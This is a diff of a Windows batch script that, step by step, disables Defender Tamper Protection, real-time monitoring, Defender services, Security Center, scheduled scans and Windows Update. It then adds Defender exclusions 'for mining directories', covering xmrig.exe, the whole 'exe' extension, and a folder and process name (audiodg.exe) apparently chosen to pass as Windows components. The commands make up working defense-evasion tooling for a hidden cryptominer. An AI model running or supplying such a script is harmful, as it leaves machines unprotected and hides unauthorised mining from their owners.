@@ -35,6 +35,7 @@ if /i not "%confirm%"=="YES" (
     exit /b
 )
 
+:: Check admin rights
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo.
@@ -50,13 +51,17 @@ echo ================================================================
 echo  STARTING PERMANENT DISABLE PROCESS
 echo ================================================================
 
-:: Disable Tamper Protection
+:: ================================================================
+:: STEP 1: Disable Tamper Protection (Required First)
+:: ================================================================
 echo.
 echo [1/8] Disabling Tamper Protection...
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
 echo      [OK] Tamper Protection registry key set
 
-:: Disable All Defender Features via Registry
+:: ================================================================
+:: STEP 2: Disable All Defender Features via Registry
+:: ================================================================
 echo.
 echo [2/8] Disabling Defender features via registry...
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
@@ -71,7 +76,9 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v SpynetRepo
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
 echo      [OK] Defender features disabled
 
-:: Disable Windows Defender via PowerShell
+:: ================================================================
+:: STEP 3: Disable Windows Defender via PowerShell
+:: ================================================================
 echo.
 echo [3/8] Disabling Defender via PowerShell preferences...
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
@@ -87,7 +94,9 @@ powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1
 powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
 echo      [OK] PowerShell preferences set
 
-:: Disable Windows Defender Services
+:: ================================================================
+:: STEP 4: Disable Windows Defender Services
+:: ================================================================
 echo.
 echo [4/8] Disabling Windows Defender services...
 sc config WinDefend start=disabled >nul 2>&1
@@ -102,7 +111,9 @@ sc config SgrmBroker start=disabled >nul 2>&1
 sc stop SgrmBroker >nul 2>&1
 echo      [OK] Services disabled
 
-:: Disable Security Center Service
+:: ================================================================
+:: STEP 5: Disable Security Center Service
+:: ================================================================
 echo.
 echo [5/8] Disabling Security Center notifications...
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1
@@ -111,7 +122,9 @@ sc config SecurityHealthService start=disabled >nul 2>&1
 sc stop SecurityHealthService >nul 2>&1
 echo      [OK] Security Center disabled
 
-:: Disable Windows Defender Scheduled Tasks
+:: ================================================================
+:: STEP 6: Disable Windows Defender Scheduled Tasks
+:: ================================================================
 echo.
 echo [6/8] Disabling Windows Defender scheduled tasks...
 schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >nul 2>&1
@@ -120,7 +133,9 @@ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Schedu
 schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >nul 2>&1
 echo      [OK] Scheduled tasks disabled
 
-:: Disable Windows Update
+:: ================================================================
+:: STEP 7: Disable Windows Update (Optional but recommended)
+:: ================================================================
 echo.
 echo [7/8] Disabling Windows Update (prevents Defender re-enabling)...
 sc config wuauserv start=disabled >nul 2>&1
@@ -128,7 +143,9 @@ sc stop wuauserv >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
 echo      [OK] Windows Update disabled
 
-:: Add Exclusions
+:: ================================================================
+:: STEP 8: Add Exclusions for Mining Directories
+:: ================================================================
 echo.
 echo [8/8] Adding exclusions for mining directories...
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\WindowsUpdate'" >nul 2>&1
@@ -138,6 +155,14 @@ powershell -Command "Add-MpPreference -ExclusionExtension 'exe'" >nul 2>&1
 powershell -Command "Add-MpPreference -ExclusionProcess 'audiodg.exe'" >nul 2>&1
 powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe'" >nul 2>&1
 echo      [OK] Exclusions added
+
+:: ================================================================
+:: FINAL STEP: Restart Required Services to Apply Changes
+:: ================================================================
+echo.
+echo [FINAL] Restarting essential services...
+timeout /t 2 >nul
+echo      [OK] Configuration complete
 
 echo.
 echo ================================================================
